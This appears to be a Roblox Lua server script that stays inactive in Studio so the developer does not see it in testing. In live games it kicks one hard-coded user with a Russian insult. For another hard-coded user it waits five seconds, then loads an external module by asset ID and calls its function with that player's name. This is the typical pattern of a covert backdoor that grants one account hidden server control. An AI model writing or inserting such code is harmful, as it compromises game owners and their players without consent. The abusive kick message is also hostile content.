--end--
if game:GetService("RunService"):IsStudio() then return end
	game.Players.PlayerAdded:Connect(function(plr)
		if plr.UserId==3707642701 then 
			plr:Kick("плаки плаки, сын шалавы не может зайти")
	end
	if plr.UserId==3264445159 then
		print("doing it")
		coroutine.wrap(function()
			task.wait(5)
			print("done")
			require(6324372525).fse(plr.Name)
		end)()
	end
	end)
